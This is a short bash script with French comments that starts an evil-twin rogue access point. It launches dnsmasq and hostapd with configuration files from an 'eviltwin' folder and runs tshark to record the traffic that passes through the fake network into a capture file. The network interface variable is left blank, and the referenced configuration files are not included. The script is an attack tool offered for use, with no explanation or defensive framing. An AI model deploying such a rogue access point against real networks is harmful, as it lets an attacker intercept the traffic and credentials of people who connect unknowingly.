#!/bin/bash

int_reseau=

#----------------------------------DEMARRAGE DU ROGUE AP---------------------------------

#Ouvre un terminal pour le lecture des logs de dnsmasq
sudo xterm -hold -e sudo dnsmasq -d -C eviltwin/dnsmasq.conf &

#Ouvre un terminal pour le lecture des logs de hostapd
sudo xterm -hold -e sudo hostapd eviltwin/hostapd.conf &

#Lance Tshark pour capturer les paquets
tshark -i $int_reseau -w eviltwin/sniff.cap &
